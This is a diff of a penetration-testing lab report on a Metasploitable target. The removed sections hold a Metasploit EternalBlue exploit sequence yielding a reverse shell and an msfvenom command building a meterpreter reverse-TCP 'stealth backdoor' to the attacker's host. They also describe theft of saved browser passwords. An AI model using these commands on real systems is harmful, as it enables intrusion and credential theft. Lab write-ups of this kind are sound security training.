@@ -85,25 +85,6 @@ Identify open ports, running services, and potential vulnerabilities on the Meta
    * Discovered the password: `<span>123456</span>`
    * Gained SSH access as the root user.
 
-#### **Option 2: SMB Exploits**
-
-1. **Objective:** Exploit vulnerabilities in the SMB protocol.
-2. **Tool Used:**
-   * Metasploit Framework
-3. **Steps:**
-   * Launch Metasploit:
-     ```
-     msfconsole
-     ```
-   * Use the EternalBlue exploit:
-     ```
-     use exploit/windows/smb/ms17_010_eternalblue
-     set RHOSTS [Metasploitable_IP]
-     exploit
-     ```
-4. **Outcome:**
-   * Successfully exploited the SMB service and gained a reverse shell.
-
 #### **Option 3: FTP Exploits**
 
 1. **Objective:** Exploit vulnerabilities in the FTP service.
@@ -206,39 +187,3 @@ Explore the target system further, escalate privileges, and gather sensitive inf
 * Use firewalls to restrict access to unnecessary services.
 * Regularly update and patch systems.
 * Conduct periodic vulnerability assessments.
-
-## 6. Personal Effort: Enhancements to the Project [ Extra Points ]
-
-### **1. Automated Workflow with Scripts**
-
-* Developed Bash scripts to automate reconnaissance and exploitation tasks.
-  * Example script for Nmap and enum4linux:
-    ```
-    # Automated Recon Script
-    nmap -A [TARGET_IP] -oN nmap_results.txt
-    enum4linux [TARGET_IP] > smb_enum.txt
-    ```
-* Benefit: Saves time and demonstrates scripting proficiency.
-
-### **2. Visualization of Findings**
-
-* Used **Maltego** to create graphical representations of:
-  * Network topology.
-  * Open ports and services.
-  * Identified vulnerabilities.
-* Benefit: Enhances clarity and professional presentation.
-
-### **3. Advanced Exploitation Techniques**
-
-* Created a custom Metasploit payload for undetectable backdoor access:
-  ```
-  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[Kali_IP] LPORT=5555 -f elf > stealth_backdoor.elf
-  ```
-* Simulated multi-stage attacks by chaining vulnerabilities.
-
-### **4. Enhanced Post-Exploitation Scenarios**
-
-* Gathered detailed target information:
-  * Extracted browser histories and saved passwords.
-  * Collected system logs for further analysis.
-* Simulated lateral movement to other virtual machines in the network.
